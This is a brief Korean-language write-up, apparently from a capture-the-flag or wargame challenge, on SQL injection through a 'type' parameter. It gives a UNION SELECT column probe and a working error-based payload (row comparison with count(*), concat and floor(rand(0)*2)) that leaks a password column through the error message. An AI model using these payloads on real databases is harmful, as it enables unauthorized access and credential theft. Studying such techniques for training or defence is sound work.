# exploit
- type으로 서브쿼리를 작성해야함
> option value : 0 union select 1,2,3,4,5 from dual
- user_table 컬럼 다섯개임

- t_user는 임시테이블이기 때문에 다중 접속이 불가능함
- extractvalue, updatexml 함수도 사용 불가

- 데이터 부분을 서브쿼리로 지정하지 않고 컬럼명을 다이렉트로 쓴 상태로 데이터를 뽑을 수 있는 에러베이스드 구문을 사용

> 1 or row(1,1)>(select count(*),concat(ps,0x41,floor(rand(0)*2)) as test from information_schema.tables group by test limit 1)
>> 0x41 A
>> floor(rand(0) * 2) --> 1
>> 즉 alert으로 나온 값에서 A1 을 제외한 나머지 값이 pw가 됨
>> concat...
>> information_schema.tables ..